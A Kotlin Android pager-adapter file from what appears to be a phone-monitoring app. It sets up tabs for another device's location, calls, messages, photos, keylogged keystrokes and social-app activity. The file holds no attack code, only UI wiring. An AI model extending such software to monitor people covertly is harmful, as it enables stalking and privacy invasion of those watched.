package com.github.midros.istheapp.ui.activities.main

import android.content.Context
import android.support.v4.app.Fragment
import android.support.v4.app.FragmentManager
import android.support.v4.app.FragmentPagerAdapter
import android.view.ViewGroup
import com.github.midros.istheapp.R
import com.github.midros.istheapp.ui.fragments.calls.CallsFragment
import com.github.midros.istheapp.ui.fragments.photo.PhotoFragment
import com.github.midros.istheapp.ui.fragments.keylog.KeysFragment
import com.github.midros.istheapp.ui.fragments.maps.MapsFragment
import com.github.midros.istheapp.ui.fragments.message.MessageFragment
import com.github.midros.istheapp.ui.fragments.setting.SettingFragment
import com.github.midros.istheapp.ui.fragments.social.SocialFragment
import com.github.midros.istheapp.ui.widget.CustomTabLayout
import javax.inject.Inject


/**
 * Created by luis rafael on 19/03/18.
 */
class PagerAdapterFragment @Inject constructor(val context: Context, supportFragment: FragmentManager) : FragmentPagerAdapter(supportFragment) {


    override fun getItem(arg0: Int): Fragment? {
        return when (arg0) {
            0 -> MapsFragment()
            1 -> CallsFragment()
            2 -> MessageFragment()
            3 -> PhotoFragment()
            4 -> KeysFragment()
            5 -> SocialFragment()
            6 -> SettingFragment()
            else -> null
        }
    }

    override fun getCount(): Int {
        return 7
    }

    override fun destroyItem(container: ViewGroup, position: Int, any: Any) {
        //super.destroyItem(container, position, any)
        /*if (position <= count) {
            val manager = (any as Fragment).fragmentManager
            if (manager!=null){
                val trans = manager.beginTransaction()
                trans.remove(any)
                trans.commit()
            }
        }*/
    }

    fun setIconTextTabs(tab: CustomTabLayout) {
        tab.getIndicatorTabAt(0).setIcon(R.drawable.ic_map_black_24dp)
        tab.getIndicatorTabAt(0).setText(R.string.maps)
        tab.getIndicatorTabAt(1).setIcon(R.drawable.ic_call_black_24dp)
        tab.getIndicatorTabAt(1).setText(R.string.calls)
        tab.getIndicatorTabAt(2).setIcon(R.drawable.ic_message_black_24dp)
        tab.getIndicatorTabAt(2).setText(R.string.messages)
        tab.getIndicatorTabAt(3).setIcon(R.drawable.ic_linked_camera_black_24dp)
        tab.getIndicatorTabAt(3).setText(R.string.photographic)
        tab.getIndicatorTabAt(4).setIcon(R.drawable.ic_keyboard_black_24dp)
        tab.getIndicatorTabAt(4).setText(R.string.keylog)
        tab.getIndicatorTabAt(5).setIcon(R.drawable.ic_red_social)
        tab.getIndicatorTabAt(5).setText(R.string.social)
        tab.getIndicatorTabAt(6).setIcon(R.drawable.ic_settings_black_24dp)
        tab.getIndicatorTabAt(6).setText(R.string.setting)
    }
}